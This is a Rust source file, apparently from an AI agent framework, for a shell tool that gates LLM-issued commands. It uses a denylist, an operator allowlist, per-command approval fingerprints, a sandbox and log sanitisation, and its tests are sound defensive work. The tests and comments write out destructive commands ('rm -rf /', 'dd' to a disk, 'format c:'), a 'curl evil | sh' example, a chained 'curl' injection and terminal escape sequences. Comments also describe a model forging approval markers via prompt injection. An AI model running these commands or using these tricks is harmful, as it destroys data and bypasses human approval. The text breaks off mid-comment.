use async_trait::async_trait;
use garraia_common::{Result, safety_gate};
use std::time::Duration;
use tokio::process::Command;

use super::approval::ApprovalFingerprint;
use super::{Tool, ToolContext, ToolOutput};

const TIMEOUT_PADRAO_SEGS: u64 = 30;
const MAX_BYTES_SAIDA: usize = 32 * 1024;

/// Allow list of safe commands for read-only mode - GAR-236
const ALLOW_LIST_READONLY: &[&str] = &[
    "ls",
    "dir",
    "pwd",
    "cd",
    "cat",
    "type",
    "head",
    "tail",
    "grep",
    "find",
    "date",     // Unix: get current date/time
    "get-date", // PowerShell: get current date/time
    "git status",
    "git log",
    "git diff",
    "git branch",
    "cargo",
    "rustc",
];

/// Executa comandos de shell com timeout configurável e limite de saída.
/// No Windows utiliza PowerShell. Em sistemas Unix-like utiliza Bash.
pub struct BashTool {
    timeout: Duration,
    allow_readonly: bool,
    /// GAR-187: When true, commands matching CONFIRM_LIST require user approval
    /// before execution. Approval arrives via `ToolContext.approval`, and
    /// vale para O COMANDO aprovado, nao para o turno (#1078 item 2).
    confirmation_enabled: bool,
    /// #1105: padrões que o operador declarou como confiáveis. Avaliados
    /// **depois** da denylist e **antes** do tier risky, e esta é a ordem que
    /// importa: a lista é positiva (só o que está nela escapa da confirmação),
    /// mas ela não perdoa um comando perigoso — `is_dangerous` continua
    /// rodando primeiro e é inegociável.
    allowlist: Vec<String>,
    /// Sandbox por tool (P0 gap analysis 2026-09-15). `default` = Off: o
    /// comando roda no host como sempre. Quando a policy se aplica à tool
    /// `bash`, o comando é envolvido no backend (Docker/Podman/SSH) —
    /// fail-closed se o backend não existir. Aplicado por ÚLTIMO, depois de
    /// todas as checagens de segurança (sandbox é camada adicional, não
    /// substituto do safety gate).
    sandbox: crate::sandbox::SandboxPolicy,
}

impl BashTool {
    pub fn new(timeout_secs: Option<u64>) -> Self {
        Self {
            timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
            allow_readonly: false,
            confirmation_enabled: false,
            allowlist: Vec::new(),
            sandbox: crate::sandbox::SandboxPolicy::default(),
        }
    }

    /// GAR-187: Create a BashTool with human-in-the-loop confirmation for risky commands.
    pub fn new_with_confirmation(timeout_secs: Option<u64>) -> Self {
        Self {
            timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
            allow_readonly: false,
            confirmation_enabled: true,
            allowlist: Vec::new(),
            sandbox: crate::sandbox::SandboxPolicy::default(),
        }
    }

    /// Create a read-only BashTool that only allows safe commands
    pub fn new_readonly(timeout_secs: Option<u64>) -> Self {
        Self {
            timeout: Duration::from_secs(timeout_secs.unwrap_or(TIMEOUT_PADRAO_SEGS)),
            allow_readonly: true,
            confirmation_enabled: false,
            allowlist: Vec::new(),
            sandbox: crate::sandbox::SandboxPolicy::default(),
        }
    }

    /// #1105: allowlist do operador — padrões de comando que ele declarou
    /// confiáveis e que por isso não precisam de confirmação.
    ///
    /// Sintaxe deliberadamente pobre de propósito: `prefixo*` (coringa só no
    /// fim) ou texto exato. Nada de regex, nada de coringa no meio — um
    /// padrão auditável a olho nu é o ponto. Padrões com `*` fora do fim são
    /// recusados com warning em vez de interpretados: adivinhar a intenção de
    /// um coringa no meio é como se abre um `rm -rf *` por acidente.
    ///
    /// `"*"` puro (e `" *"` etc.) também é recusado: o coringa sozinho vira
    /// prefixo vazio, que casa com **todo** comando não composto — um bypass
    /// blanket do tier arriscado travestido de padrão. Desligar a proteção é
    /// uma decisão que o operador toma ao não configurar a allowlist, não
    /// uma que um caractere toma por ele.
    ///
    /// Um padrão de prefixo **nunca** cobre um comando composto (`;`,
    /// `&&`, `$(...)`, pipe, redireção): ver [`Self::matches_allowlist`].
    #[must_use = "devolve um BashTool novo; o receptor nao e alterado"]
    pub fn with_allowlist(mut self, patterns: Vec<String>) -> Self {
        self.allowlist = patterns
            .into_iter()
            .filter(|p| {
                // #1105 (auditoria de seguranca): padrao vazio ou so espaco
                // nao casa com nada e engana quem escreveu — recusado junto
                // com o coringa fora do fim, e pelo mesmo motivo.
                // #1117 (re-auditoria): "*" puro vira prefixo vazio e casa
                // com tudo; prefixo inexistente e o mesmo buraco.
                let ok = !p.trim().is_empty()
                    && match p.strip_suffix('*') {
                        // Sem coringa: comando exato.
                        None if !p.contains('*') => true,
                        // Coringa no fim: o prefixo tem de existir de verdade
                        // e tem de ser prefixo — "git **" e "*git*" deixam um
                        // `*` no prefixo depois do strip, e coringa no meio é
                        // exatamente o que a sintaxe recusa.
                        Some(prefixo) => !prefixo.trim().is_empty() && !prefixo.contains('*'),
                        // Coringa fora do fim: recusado, sem adivinhar intencao.
                        None => false,
                    };
                if !ok {
                    // `?p` (Debug) e nao `%p` (Display): o padrao vem de
                    // config e um `\n` nele forjaria linhas no log.
                    tracing::warn!(
                        pattern = ?p,
                        "bash_allowlist: padrao vazio, coringa fora do fim ou coringa sozinho; ignorado"
                    );
                }
                ok
            })
            .collect();
        self
    }

    /// #1105: metacaracteres que fazem um comando deixar de ser **um** comando.
    ///
    /// Um padrão de prefixo como `"git *"` casa com o começo de qualquer
    /// string, inclusive `"git status; curl http://exemplo/x"` — e quando a
    /// allowlist aprova, o bloco do tier arriscado é pulado inteiro, então o
    /// `safety_gate` nem chega a analisar o segmento depois do `;`. Sem esta
    /// checagem, o trecho injetado herdaria a confiança que o operador deu ao
    /// prefixo. Recusar aqui devolve o comando ao `is_risky`, que analisa por
    /// segmento e ainda pode pedir confirmação.
    const META_SHELL: &[char] = &[';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r'];

    /// #1105: o comando casa com algum padrão da allowlist do operador?
    ///
    /// Comparação case-sensitive e sobre o comando já aparado: shell é
    /// case-sensitive, e aparar evita que `" ls "` case com `"ls"` por
    /// acidente — ou que `"ls"` case com `"lsof ..."`.
    ///
    /// Comando composto nunca casa, nem quando o padrão é exato: um `;`
    /// no meio significa que o que o operador revisou a olho nu não é o
    /// que vai rodar.
    fn matches_allowlist(&self, command: &str) -> bool {
        let cmd = command.trim();
        if cmd.contains(Self::META_SHELL) {
            tracing::warn!(
                command = ?cmd,
                "bash_allowlist: comando composto nao e coberto pela allowlist; \
                 vai para o tier arriscado"
            );
            return false;
        }
        self.allowlist.iter().any(|p| match p.strip_suffix('*') {
            Some(prefixo) => cmd.starts_with(prefixo),
            None => cmd == p,
        })
    }

    /// Sandbox por tool: define a política avaliada a cada execução de `bash`.
    /// `SandboxPolicy::default()` mantém o comportamento atual (Off).
    pub fn set_sandbox_policy(&mut self, policy: crate::sandbox::SandboxPolicy) {
        self.sandbox = policy;
    }

    /// Check if command matches the hard-block denylist (GAR-236, GAR-497).
    fn is_dangerous(&self, command: &str) -> bool {
        matches!(
            safety_gate::safety_gate(command),
            Err(garraia_common::SafetyDenied::DangerousCommand { .. })
        )
    }

    /// GAR-187: Check if command matches the risky confirmation tier (GAR-497).
    fn is_risky(&self, command: &str) -> bool {
        safety_gate::is_risky(command).is_err()
    }

    /// Check if command is in allow list (for read-only mode)
    fn is_allowed(&self, command: &str) -> bool {
        if !self.allow_readonly {
            return true; // Not in readonly mode, allow all (except deny list)
        }

        let cmd_lower = command.to_lowercase().trim().to_string();
        for pattern in ALLOW_LIST_READONLY {
            if cmd_lower.starts_with(&pattern.to_lowercase())
                || cmd_lower.contains(&pattern.to_lowercase())
            {
                return true;
            }
        }
        false
    }
}

/// Tamanho maximo de comando que vai para o log.
const LOG_COMANDO_MAX: usize = 120;

/// Prepara um comando de `bash` para ir a um campo de log.
///
/// O que se registra aqui e uma linha de shell escrita por um LLM — que o
/// projeto ja trata como influenciavel por injecao indireta de prompt
/// (#1213) — e ela sai por campo `%` do `tracing`, que **nao escapa nada**.
/// Tres coisas precisam acontecer, nesta ordem:
///
/// 1. **Redigir — parcialmente, e isto e ressalva, nao garantia.** O
///    comando pode carregar credencial, entao passa por
///    [`garraia_security::redact_secrets`], o mesmo filtro dos eventos de
///    turno. Esse filtro e uma **lista fechada de formatos** (`sk-`,
///    `ghp_`, `xoxb-`, JWT, AKIA, Telegram, senha em connection string):
///    ele pega o que tem forma reconhecivel e **nao** pega segredo
///    generico. Uma senha passada por flag, um par
///    `<VAR>=<40 chars base64>` ou um cabecalho com token opaco passam
///    inteiros. "Passa por `redact_secrets`" nao e o mesmo que "esta
///    redigido", e a diferenca e a razao de o caminho de sucesso logar em
///    `debug!` e nao em `info!`, e de [`LOG_COMANDO_MAX`] existir como
///    limite generico.
/// 2. **Neutralizar controle.** Sem isto um `\x1b]0;…\x07` no comando troca
///    o titulo da janela do operador, e `\x1b[2J` limpa a tela dele — o
///    mesmo ataque que o #995 fechou para saida de ferramenta, pela mesma
///    porta. [`sanear_controles`] tira todo C0/C1/DEL; com
///    `preservar_quebras: false` a quebra vira espaco, porque campo de log
///    e de uma linha so.
/// 3. **Truncar.** Log e recurso compartilhado. Por ultimo de proposito: se
///    o corte viesse antes, ele poderia cair no meio de uma sequencia ANSI e
///    deixar um OSC **sem terminador**, e ai o terminal engole as linhas de
///    log seguintes procurando o fim que nunca vem. Depois do passo 2 nao ha
///    mais sequencia para partir. O corte e em fronteira de char, para nao
///    panicar em UTF-8 multibyte.
fn comando_para_log(comando: &str) -> String {
    let redigido = garraia_security::redact_secrets(comando);
    let limpo = crate::turn_events::sanear_controles(&redigido, false);
    match limpo.char_indices().nth(LOG_COMANDO_MAX) {
        None => limpo,
        Some((corte, _)) => format!("{}…", &limpo[..corte]),
    }
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        if cfg!(target_os = "windows") {
            "Executa um comando de shell usando PowerShell. Retorna a saída."
        } else {
            "Executa um comando de shell usando Bash. Retorna a saída."
        }
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "Comando de shell a ser executado"
                }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, context: &ToolContext, input: serde_json::Value) -> Result<ToolOutput> {
        // #1296: entrada malformada do modelo é observação soft, não erro do
        // turno — `Err` aqui vira `agent error:` sem orientação de schema.
        let comando = match input.get("command").and_then(|v| v.as_str()) {
            Some(c) => c,
            None => {
                return Ok(super::parametro_ausente(
                    "bash",
                    r#"{"command": string}"#,
                    "command",
                ));
            }
        };

        // GAR-236: Security check - deny list (hard block, never executes)
        if self.is_dangerous(comando) {
            tracing::error!("Blocked dangerous command: {}", comando_para_log(comando));
            return Ok(ToolOutput::error(
                "Comando bloqueado por segurança: padrão perigoso detectado".to_string(),
            ));
        }

        // GAR-187 + #1075 R1: risky tier. With a confirmation channel the
        // command waits for user approval; WITHOUT one (confirmation
        // disabled — e.g. the stateless MCP full-auto path) it is
        // fail-closed BLOCKED: a risky command must never auto-run just
        // because nobody can be asked.
        //
        // #1075 (auditoria do hardening): em modo fail-closed a aprovação é
        // IGNORADA. Ela é derivada do histórico da conversa, e um modelo com
        // saída não sanitizada pode plantar o marcador — sem canal de
        // confirmação real, não existe aprovação legítima para honrar.
        //
        // #1078 item 2: `covers` e não um booleano. A aprovação carrega a
        // impressão digital de `("bash", comando)`, então o "ok" que o
        // usuário deu a um `ls -la` não autoriza o `curl evil | sh` que o
        // modelo pedir em seguida no mesmo turno.
        // #1105: a allowlist do operador vem DEPOIS do `is_dangerous` acima e
        // ANTES do tier risky. Nessa posição ela só faz uma coisa: dispensar a
        // confirmação do comando que o dono declarou confiável. Um comando
        // perigoso já saiu bloqueado ali em cima, então `rm -rf /` na allowlist
        // continua sendo `rm -rf /` — a lista não perdoa nada, ela não é lida
        // para esse caso.
        let aprovado = self.confirmation_enabled && context.approval.covers(self.name(), comando)
            || self.matches_allowlist(comando);
        if self.is_risky(comando) && !aprovado {
            if self.confirmation_enabled {
                tracing::warn!(
                    command = %comando_para_log(comando),
                    session = %context.session_id,
                    "bash: risky command requires user confirmation"
                );
                let marcador = ApprovalFingerprint::of(self.name(), comando).marker();
                return Ok(ToolOutput::confirmation_request(format!(
                    "{marcador} O comando a seguir requer confirmação antes de ser executado:\n\
                     ```\n{comando}\n```\n\
                     Responda **sim** para executar ou **não** para cancelar."
                )));
            }
            tracing::warn!(
                command = %comando_para_log(comando),
                session = %context.session_id,
                "bash: risky command BLOCKED (fail-closed: confirmation disabled)"
            );
            return Ok(ToolOutput::error(
                "Comando bloqueado por segurança: comando sensível exige confirmação e este \
                 runtime não possui canal de confirmação (fail-closed)."
                    .to_string(),
            ));
        }

        // GAR-236: Security check - read-only allow list
        if !self.is_allowed(comando) {
            tracing::warn!(
                "Command not in allow list for read-only mode: {}",
                comando_para_log(comando)
            );
            return Ok(ToolOutput::error(
                "Comando não permitido no modo read-only. Use: ls, dir, cat, git, cargo, etc."
                    .to_string(),
            ));
        }

        let (shell, arg) = if cfg!(target_os = "windows") {
            ("powershell", "-Command")
        } else {
            ("bash", "-c")
        };

        // Sandbox por tool (P0 gap analysis 2026-09-15): avalia DEPOIS de
        // denylist/risco/read-only. Se aplicável, o comando vira o payload
        // do backend (Docker/Podman com no-new-privileges + --network none);
        // backend ausente => erro fail-closed, nunca fallback para o host.
        let comando = match self.sandbox.wrap_command(
            self.name(),
            comando,
            context.working_dir.as_deref().unwrap_or("."),
        ) {
            Ok(None) => comando.to_string(),
            Ok(Some(sandboxed)) => {
                // `debug!`, e nao `info!`, de proposito — nao promova.
                //
                // Ate a #1225 este ramo era inalcancavel (nenhum operador
                // conseguia ligar o sandbox), entao em `info!` ele seria
                // exposicao NOVA: no nivel padrao, TODO comando sandboxado
                // passaria a ir para o log. E `redact_secrets` e por prefixo
                // conhecido — nao pega `mysql -p'…'` nem
                // `AWS_SECRET_ACCESS_KEY=…`, entao "esta redigido" nao
                // autoriza registrar tudo por padrao. O caso de sucesso e
                // rotina; quem quer auditar liga o `debug`. O fail-closed
                // abaixo e que e evento, e fica em `error!`.
                tracing::debug!(
                    command = %comando_para_log(comando),
                    session = %context.session_id,
                    "bash: comando executado dentro do sandbox"
                );
                sandboxed
            }
            Err(e) => {
                tracing::error!(
                    command = %comando_para_log(comando),
                    session = %context.session_id,
                    "bash: sandbox fail-closed: {}",
                    e
                );
                return Ok(ToolOutput::error(format!(
                    "Comando bloqueado: sandbox obrigatório não pôde ser aplicado. {}",
                    e
                )));
            }
        };

        let mut cmd = Command::new(shell);
        cmd.arg(arg).arg(comando);
        // #1270 (paridade do #1269): o filho nunca le a entrada padrao do
        // gateway — em terminal, pipe e servico o comportamento fica o mesmo,
        // e um `cat` sem argumento nao rouba o que o operador digitou no
        // terminal do `garra chat`. Ate a varredura #1270, `repo_search`,
        // `git_diff` e `code_review` fechavam o stdin e este nao.
        cmd.stdin(std::process::Stdio::null());
        // #1075 R3: the child runs in the session working_dir when set, and
        // (unix) inherits ONLY the allowlisted variables — the parent
        // process (MCP server / gateway) carries secrets in its env that
        // must never reach an LLM-driven shell. Windows PowerShell needs
        // more of its environment to boot, so the scrub is unix-only.
        if let Some(dir) = context.working_dir.as_deref() {
            cmd.current_dir(dir);
        }
        #[cfg(unix)]
        {
            cmd.env_clear();
            for (key, value) in safety_gate::allowed_child_env() {
                cmd.env(key, value);
            }
        }

        let resultado = tokio::time::timeout(self.timeout, cmd.output()).await;

        match resultado {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                let mut combinado = String::new();

                if !stdout.is_empty() {
                    combinado.push_str(&stdout);
                }

                if !stderr.is_empty() {
                    if !combinado.is_empty() {
                        combinado.push('\n');
                    }
                    combinado.push_str("STDERR:\n");
                    combinado.push_str(&stderr);
                }

                // Truncar se exceder limite
                if combinado.len() > MAX_BYTES_SAIDA {
                    let mut end = MAX_BYTES_SAIDA;
                    while end > 0 && !combinado.is_char_boundary(end) {
                        end -= 1;
                    }
                    combinado.truncate(end);
                    combinado.push_str("\n... (saída truncada)");
                }

                if combinado.is_empty() {
                    combinado =
                        format!("(código de saída: {})", output.status.code().unwrap_or(-1));
                }

                if output.status.success() {
                    Ok(ToolOutput::success(combinado))
                } else {
                    Ok(ToolOutput::error(format!(
                        "código de saída {}: {}",
                        output.status.code().unwrap_or(-1),
                        combinado
                    )))
                }
            }
            Ok(Err(e)) => Ok(ToolOutput::error(format!("falha ao executar comando: {e}"))),
            Err(_) => Ok(ToolOutput::error(format!(
                "comando excedeu o tempo limite após {}s",
                self.timeout.as_secs()
            ))),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tools::approval::ToolApproval;

    /// `approved` liga a aprovacao PARA O COMANDO que o teste vai rodar.
    /// Antes era um booleano solto que valia para qualquer comando — e era
    /// exatamente esse o defeito do #1078 item 2.
    fn ctx_para(comando: &str, approved: bool) -> ToolContext {
        ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: if approved {
                ToolApproval::granted("bash", comando)
            } else {
                ToolApproval::None
            },
            working_dir: None,
            project_id: None,
        }
    }

    /// Os testes que nao exercitam o caminho aprovado usam o comando de
    /// risco padrao deste modulo.
    fn ctx(approved: bool) -> ToolContext {
        ctx_para("printenv PATH", approved)
    }

    #[tokio::test]
    async fn executa_comando_simples() {
        let tool = BashTool::new(None);

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({"command": "echo hello"}))
            .await
            .unwrap();

        assert!(!output.is_error);
        assert!(output.content.contains("hello"));
    }

    #[tokio::test]
    async fn reporta_erro_em_comando_falho() {
        let tool = BashTool::new(None);

        let cmd = if cfg!(target_os = "windows") {
            "exit 1"
        } else {
            "false"
        };

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({"command": cmd}))
            .await
            .unwrap();

        assert!(output.is_error);
    }

    /// #1296: comando ausente é observação soft (`Ok` + `is_error`) — o
    /// modelo recebe a orientação de schema e reenvia a chamada no mesmo
    /// turno; nunca `Err`, que em caminhos sem amortecimento mata o passo.
    #[tokio::test]
    async fn comando_ausente_e_observacao_soft() {
        let tool = BashTool::new(None);

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({}))
            .await
            .expect("parâmetro ausente é soft-error, não Err");

        assert!(output.is_error);
        assert!(output.content.contains("'command'"), "{}", output.content);
        assert!(output.content.contains("Reenvie"), "{}", output.content);
    }

    #[test]
    fn powershell_format_flag_nao_e_bloqueado() {
        let tool = BashTool::new(None);
        // PowerShell -Format parameter must NOT be blocked
        assert!(!tool.is_dangerous("Get-Date -Format \"HH:mm:ss\""));
        assert!(!tool.is_dangerous("get-date -format 'yyyy-MM-dd'"));
        assert!(!tool.is_dangerous("Select-Object -Property Name, Format"));
    }

    #[test]
    fn format_disco_e_bloqueado() {
        let tool = BashTool::new(None);
        assert!(tool.is_dangerous("format c:"));
        assert!(tool.is_dangerous("FORMAT C: /Q"));
        assert!(tool.is_dangerous("format d: /fs:ntfs"));
        assert!(tool.is_dangerous("diskpart"));
    }

    #[test]
    fn comandos_perigosos_sao_bloqueados() {
        let tool = BashTool::new(None);
        assert!(tool.is_dangerous("rm -rf /"));
        assert!(tool.is_dangerous("mkfs.ext4 /dev/sda"));
        assert!(tool.is_dangerous("dd if=/dev/zero of=/dev/sda"));
        assert!(tool.is_dangerous("shutdown -h now"));
    }

    #[test]
    fn comandos_seguros_nao_sao_bloqueados() {
        let tool = BashTool::new(None);
        assert!(!tool.is_dangerous("date"));
        assert!(!tool.is_dangerous("echo hello world"));
        assert!(!tool.is_dangerous("ls -la"));
        assert!(!tool.is_dangerous("cargo build"));
        assert!(!tool.is_dangerous("git log --oneline"));
    }

    #[tokio::test]
    async fn captura_stderr() {
        let tool = BashTool::new(None);

        let cmd = if cfg!(target_os = "windows") {
            "Write-Error 'err'"
        } else {
            "echo err >&2"
        };

        let ctx = ToolContext {
            session_id: "test".into(),
            user_id: None,
            is_heartbeat: false,
            approval: crate::tools::approval::ToolApproval::None,
            working_dir: None,
            project_id: None,
        };

        let output = tool
            .execute(&ctx, serde_json::json!({"command": cmd}))
            .await
            .unwrap();

        assert!(output.content.contains("err"));
    }

    // ── R1 (#1075): risky tier fail-closed when confirmation is unavailable ──

    #[tokio::test]
    async fn r1_risky_bloqueado_sem_canal_de_confirmacao() {
        // Fail-closed: with confirmation DISABLED there is no approval
        // channel (e.g. the stateless MCP full-auto path) — a risky
        // command is BLOCKED, never auto-run.
        unsafe {
            std::env::set_var("GARRAIA_R1_CANARY", "leak-canary");
        }
        let tool = BashTool::new(None); // confirmation_enabled = false
        let output = tool
            .execute(
                &ctx(false),
                serde_json::json!({"command": "printenv GARRAIA_R1_CANARY"}),
            )
            .await
            .unwrap();

        assert!(output.is_error, "{}", output.content);
        assert!(output.content.contains("bloqueado"), "{}", output.content);
        // The command must NOT have run: the canary value never shows up.
        assert!(
            !output.content.contains("leak-canary"),
            "risky command auto-ran without confirmation: {}",
            output.content
        );
    }

    #[tokio::test]
    async fn r1_pede_confirmacao_com_canal_ativo() {
        let tool = BashTool::new_with_confirmation(None);
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();

        assert!(output.requires_confirmation, "{}", output.content);
        assert!(
            output.content.contains("CONFIRM_REQUIRED"),
            "{}",
            output.content
        );
        // confirmation_request carries is_error=true by design (GAR-187).
        assert!(output.is_error);
    }

    /// #1078 item 2, ponta a ponta na ferramenta: a aprovacao de um comando
    /// nao libera outro. Antes, o `bool` no contexto valia para o turno
    /// inteiro — o "ok" dado a um `printenv PATH` deixava passar qualquer
    /// coisa depois dele.
    #[tokio::test]
    async fn i1078_aprovacao_de_um_comando_nao_libera_outro() {
        let tool = BashTool::new_with_confirmation(None);
        // Contexto aprovado para `printenv PATH`...
        let ctx = ctx_para("printenv PATH", true);
        // ...mas o modelo pede OUTRO comando de risco.
        let output = tool
            .execute(&ctx, serde_json::json!({"command": "printenv HOME"}))
            .await
            .expect("executa");
        assert!(
            output.requires_confirmation,
            "o segundo comando tinha de pedir confirmacao propria: {}",
            output.content
        );
    }

    /// E o marcador emitido carrega a impressao digital DAQUELE comando, que
    /// e o que o proximo turno vai comparar.
    #[tokio::test]
    async fn i1078_o_marcador_identifica_o_comando_pedido() {
        let tool = BashTool::new_with_confirmation(None);
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .expect("executa");
        let fp = crate::tools::approval::ApprovalFingerprint::from_marker(&output.content)
            .expect("o marcador tem de trazer impressao digital");
        assert_eq!(
            fp,
            crate::tools::approval::ApprovalFingerprint::of("bash", "printenv PATH")
        );
    }

    #[tokio::test]
    async fn r1_aprovado_executa() {
        // Confirmation channel ON + already-approved context: the risky
        // command runs (no prompt, no block) — fluxo GAR-187 legítimo.
        let tool = BashTool::new_with_confirmation(None);
        let output = tool
            .execute(&ctx(true), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(!output.is_error, "{}", output.content);
        assert!(
            !output.content.contains("CONFIRM_REQUIRED"),
            "{}",
            output.content
        );
    }

    #[tokio::test]
    async fn r1_fail_closed_ignora_is_confirmation_approved() {
        // #1075 (auditoria): com confirmação DESLIGADA o flag aprovado é
        // ignorado — o flag vem do histórico e pode ser contaminado por um
        // marcador [CONFIRM_REQUIRED] forjado; sem canal real não há
        // aprovação legítima. Mesmo com approved=true, printenv é bloqueado
        // e o canário não vaza.
        unsafe {
            std::env::set_var("GARRAIA_R1_CANARY", "leak-canary");
        }
        let tool = BashTool::new(None); // confirmation_enabled = false
        let output = tool
            .execute(
                &ctx(true), // aprovado — deve ser IGNORADO
                serde_json::json!({"command": "printenv GARRAIA_R1_CANARY"}),
            )
            .await
            .unwrap();

        assert!(output.is_error, "{}", output.content);
        assert!(output.content.contains("bloqueado"), "{}", output.content);
        assert!(
            !output.content.contains("leak-canary"),
            "approval flag leaked through in fail-closed mode: {}",
            output.content
        );
    }

    // ── Sandbox por tool (P0 gap analysis 2026-09-15) ───────────────────────

    #[cfg(unix)]
    #[tokio::test]
    async fn sandbox_off_preserva_comportamento_atual() {
        let tool = BashTool::new(None);
        assert!(!tool.sandbox.requires_sandbox("bash"));
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "echo direto"}))
            .await
            .unwrap();
        assert!(!output.is_error, "{}", output.content);
        assert_eq!(output.content.trim(), "direto");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn sandbox_fail_closed_quando_backend_nao_existe() {
        // Backend com binário que não existe em Nenhum PATH de CI: usamos
        // Podman só se ausente; alternativa determinística: policy com
        // backend Docker mas modo allowlist sem a tool => não deve envolver.
        // Para o fail-closed real, mascaramos PATH do host? Não dá — então
        // testamos via SSH com host que rejeita? O contrato fail-closed
        // unitário já é coberto em crate::sandbox::tests. Aqui validamos a
        // integração: policy Off => comando passa; policy All com backend
        // None => erro amigável (sem backend definido), SEM executar.
        let mut tool = BashTool::new(None);
        tool.set_sandbox_policy(crate::sandbox::SandboxPolicy {
            mode: crate::sandbox::SandboxMode::All,
            backend: None,
            ..crate::sandbox::SandboxPolicy::default()
        });
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "echo nunca"}))
            .await
            .unwrap();
        assert!(output.is_error, "sandbox obrigatório deve bloquear");
        assert!(
            output.content.contains("sandbox"),
            "mensagem deve explicar o sandbox: {}",
            output.content
        );
        assert!(
            !output.content.contains("nunca"),
            "comando não pode ter rodado"
        );
    }

    /// #1225 S5: o caminho sandboxado passou a ser alcancavel, e o que ele
    /// registra e uma linha escrita por um LLM — tratada pelo projeto como
    /// influenciavel por injecao indireta de prompt (#1213). Ela pode
    /// carregar segredo e pode ser enorme; o log e recurso compartilhado.
    /// #1225 N3: nenhum sitio de log desta tool pode registrar o comando
    /// cru. O `tracing` nao escapa nem campo `%` nem `{}`, e o comando vem de
    /// um LLM — entao todo caminho tem de passar pelo `comando_para_log`.
    ///
    /// Varre o fonte no idioma do `mcp_server.rs`, porque a alternativa e
    /// confiar em revisao: quando esta funcao foi introduzida, quatro sitios
    /// passaram a usa-la e dois ficaram crus por descuido, e nada falhou.
    #[test]
    fn nenhum_log_do_bash_tool_registra_o_comando_cru() {
        let fonte = include_str!("bash_tool.rs");
        let producao = fonte.split("#[cfg(test)]").next().unwrap_or(fonte);
        // As duas formas cruas possiveis: campo `%` do tracing e `{}`
        // posicional. `?comando` (Debug) NAO entra na lista — Debug escapa
        // controle, e e a escolha deliberada dos dois sitios de
        // `bash_allowlist`, documentada la.
        //
        // A checagem e por fronteira de identificador, e nao por `contains`
        // simples: `command = %comando` e prefixo de
        // `command = %comando_para_log(...)`, que e justamente a forma certa.
        for (i, _) in producao.match_indices("command = %comando") {
            let resto = &producao[i + "command = %comando".len()..];
            let proximo = resto.chars().next().unwrap_or(',');
            assert!(
                proximo == '_',
                "log com comando cru em `command = %comando` — use \
                 `comando_para_log(comando)` (contexto: {:?})",
                &producao[i..(i + 60).min(producao.len())]
            );
        }
        assert!(
            !producao.contains("}\", comando)"),
            "log com comando cru em `{{}}` posicional — use `comando_para_log(comando)`"
        );
        // E a contraprova: a funcao E usada, entao o teste acima nao esta
        // passando so porque ninguem loga comando nenhum.
        assert!(
            producao.matches("comando_para_log(comando)").count() >= 6,
            "esperava ao menos 6 sitios usando o helper; achei {}",
            producao.matches("comando_para_log(comando)").count()
        );
    }

    /// #1225 N1: o campo `%` do `tracing` nao escapa nada, e o comando vem
    /// de um LLM. Um `ESC` sobrevivente reprograma o terminal de quem le o
    /// log — o mesmo ataque que o #995 fechou para saida de ferramenta.
    ///
    /// A assercao e por **classe de caractere**, nao por padrao: reconhecer
    /// "sequencia ANSI" por regex e um jogo que se perde (CSI, OSC, DCS,
    /// formas de dois caracteres, com e sem terminador). Sem `ESC`, `[2J` e
    /// texto inerte.
    #[test]
    fn comando_para_log_nao_deixa_passar_caractere_de_controle() {
        for hostil in [
            "echo \x1b[2J",                  // limpa a tela
            "echo \x1b]0;dono-enganado\x07", // troca o titulo da janela
            "echo \x1b[?25l",                // esconde o cursor
            "echo ok\rapagado",              // sobrescreve a linha ja impressa
            "echo \x07\x00\x08",             // BEL/NUL/BS soltos
        ] {
            let saida = comando_para_log(hostil);
            assert!(
                !saida.chars().any(char::is_control),
                "sobrou controle em {hostil:?}: {saida:?}"
            );
        }
    }

    /// O truncamento vem DEPOIS da neutralizacao, e este teste existe para
    /// essa ordem nao ser invertida por engano: um corte antes poderia cair
    /// no meio de um OSC e deixa-lo sem terminador, e ai o terminal engole
    /// as linhas de log seguintes procurando o fim que nunca chega.
    #[test]
    fn comando_para_log_trunca_depois_de_neutralizar_e_nunca_parte_sequencia() {
        // OSC longo o bastante para o corte cair dentro dele.
        let hostil = format!("echo \x1b]0;{}\x07 fim", "A".repeat(300));
        let saida = comando_para_log(&hostil);
        assert!(!saida.chars().any(char::is_control), "saida = {saida:?}");
        assert!(
            !saida.contains('\u{1b}'),
            "o OSC saiu inteiro, nao pela metade: {saida:?}"
        );
        assert!(saida.chars().count() <= LOG_COMANDO_MAX + 1);
    }

    #[test]
    fn comando_para_log_redige_segredo_e_trunca() {
        // O fixture usa a forma `ghp_` + 36 `X` por dois motivos que se
        // somam: `redact_secrets` casa com `gh[pousr]_[A-Za-z0-9.\-_]{20,}`
        // (36 >= 20), e o `XXXXX+` do allowlist do `.gitleaks.toml` impede o
